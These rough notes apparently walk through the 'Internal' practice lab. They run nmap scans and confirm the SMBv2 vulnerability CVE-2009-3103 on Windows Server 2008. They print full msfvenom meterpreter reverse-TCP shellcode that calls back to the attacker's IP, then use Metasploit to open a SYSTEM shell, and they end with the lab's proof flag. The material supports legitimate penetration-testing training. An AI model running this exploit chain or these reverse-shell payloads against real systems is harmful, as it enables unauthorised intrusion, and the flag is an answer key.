# Internal (rough notes)

Initial port scan:

```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ nmap -v -p- -T4 internal    
...

PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```

Scan against specific ports w/ service version detection and service scripts:

```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ nmap -v -Pn -p 53,135,139,445,3389,5357,49152,49153,49154,49155,49156,49157,49158 -T4 -A internal
...

PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-16T15:16:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2024-03-16T15:16:31+00:00
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-01-22T17:37:15
| Not valid after:  2023-07-24T17:37:15
| MD5:   3041:c36b:1964:0e17:4681:a96f:5a23:5506
|_SHA-1: e452:e76f:a9b4:919a:c51f:75f2:3541:27a1:d00b:742d
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb2-time: 
|   date: 2024-03-16T15:16:31
|_  start_date: 2023-01-23T17:37:08
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-16T08:16:31-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:d5:d8 (VMware)
| Names:
|   INTERNAL<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  INTERNAL<20>         Flags: <unique><active>
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
```

When I see an SMB server I always like running all of `nmap`'s scripts for SMB vulnerabilities:

```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ nmap -script smb-vuln* -v -p 139,445 -T4 internal
...

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
```

Look at that! We have confirmation that the SMB server is vulnerable to [CVE-2009-3103](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2009-3103)!

Looking up the CVE I arrive at some [exploit code in exploitdb](https://www.exploit-db.com/exploits/40280). We'll try it!

I find the exploit code available on my Kali machine:

```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ find /usr/share/exploitdb/exploits -name 40280.py
/usr/share/exploitdb/exploits/windows/remote/40280.py
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/offsec/internal]
└─$ cp /usr/share/exploitdb/exploits/windows/remote/40280.py .   
```

Reading the code, looks like I have to generate reverse shell shellcode and include it in the code:

```
┌──(kali㉿kali)-[~/offsec/internal]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.172 LPORT=443  EXITFUNC=thread  -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes
Final size of python file: 1863 bytes
buf =  b""
buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
buf += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
buf += b"\x26\x31\xff\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c"
buf += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
buf += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
buf += b"\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x01\xd3\x50"
buf += b"\x8b\x48\x18\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01"
buf += b"\xd6\x31\xff\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38"
buf += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
buf += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
buf += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
buf += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
buf += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
buf += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
buf += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
buf += b"\xac\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
buf += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
buf += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
buf += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
buf += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
buf += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
buf += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
buf += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
buf += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
buf += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
buf += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
buf += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
buf += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
buf += b"\x53\xff\xd5"
```

I modified the code several times but it did not work... I will use metasploit instead :)


Searching by CVE:

```
msf6 > search CVE-2009-3103

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff
```

Setting the exploit:

```
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Examining options:

```
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.151.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)


View the full module info with the info, or info -d command.
```

Setting option values and running:

```
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS internal
RHOSTS => internal
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST tun0
LHOST => 192.168.45.172
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.45.172:4444 
[*] 192.168.151.40:445 - Connecting to the target (192.168.151.40:445)...
[*] 192.168.151.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.151.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (176198 bytes) to 192.168.151.40
[*] Meterpreter session 1 opened (192.168.45.172:4444 -> 192.168.151.40:49159) at 2024-03-16 09:15:00 -0700

meterpreter > shell
Process 1804 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Alright, we have a foothold.

Actually... we are already root!

```
C:\Windows\system32>whoami
whoami
nt authority\system
```

In user `Administrator`'s Desktop, we find our proof:

```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is B863-254D

 Directory of C:\Users\Administrator\Desktop

02/03/2011  08:51 PM    <DIR>          .
02/03/2011  08:51 PM    <DIR>          ..
05/20/2016  10:26 PM                32 network-secret.txt
03/16/2024  09:11 AM                34 proof.txt
               2 File(s)             66 bytes
               2 Dir(s)   4,110,532,608 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
521fcdd0288f560d2bda2ee0189b8188
```